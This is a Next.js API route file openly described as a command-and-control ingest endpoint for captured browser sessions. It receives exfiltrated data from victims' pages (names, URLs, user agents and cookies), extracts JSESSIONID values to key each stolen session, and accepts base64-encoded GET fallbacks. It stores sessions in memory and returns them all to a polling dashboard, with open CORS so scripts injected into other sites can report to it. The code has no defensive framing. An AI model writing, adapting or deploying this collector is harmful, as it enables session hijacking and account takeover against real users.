// pages/api/ingest.js
// This file acts as a stateful (per-instance) store for your C2 data.
// Note: Serverless functions are stateless across cold starts, 
// but Vercel often keeps instances warm, so this works for short-term sessions.
// For production, you'd use Vercel KV or a DB.

let sessionStore = {}; // In-memory store
let sessionCount = 0;

export default function handler(req, res) {
  // Handle CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method === 'POST') {
    const data = req.body;
    
    // 1. Log to Vercel Dashboard
    console.log(`🎯 [C2 INGEST] Received data from: ${data.name || 'Unknown'} | URL: ${data.url}`);
    console.log('Payload:', JSON.stringify(data, null, 2));

    // 2. Save to In-Memory Store
    // Use JSESSIONID as key if available, otherwise URL+UA
    const sessionId = data.ck?.match(/JSESSIONID=([^;]+)/)?.[1] || 
                      `${data.url}-${data.ua}`.toString().split('').reduce((a,b)=>Math.imul(31,a)+b.charCodeAt(0)|0, 0).toString(36);
    
    sessionStore[sessionId] = {
      ...data,
      id: sessionId,
      lastSeen: new Date().toISOString(),
      sessionCount: (sessionStore[sessionId]?.sessionCount || 0) + 1
    };
    
    // 3. Return Confirmation
    return res.status(200).json({ 
      success: true, 
      id: sessionId, 
      message: `Session captured: ${data.name}`,
      totalSessions: Object.keys(sessionStore).length
    });
  }

  if (req.method === 'GET') {
    // 1. If ?data= param, parse it (for fallback GET requests)
    if (req.query.d) {
      try {
        const decoded = decodeURIComponent(escape(atob(req.query.d)));
        const data = JSON.parse(decoded);
        return handler({ method: 'POST', body: data, query: {}, headers: {} }, res);
      } catch (e) {
        return res.status(400).json({ error: 'Invalid base64 data' });
      }
    }

    // 2. Return all sessions (for Dashboard polling)
    return res.status(200).json({
      success: true,
      sessions: Object.values(sessionStore),
      count: Object.keys(sessionStore).length
    });
  }

  return res.status(405).json({ error: 'Method Not Allowed' });
}
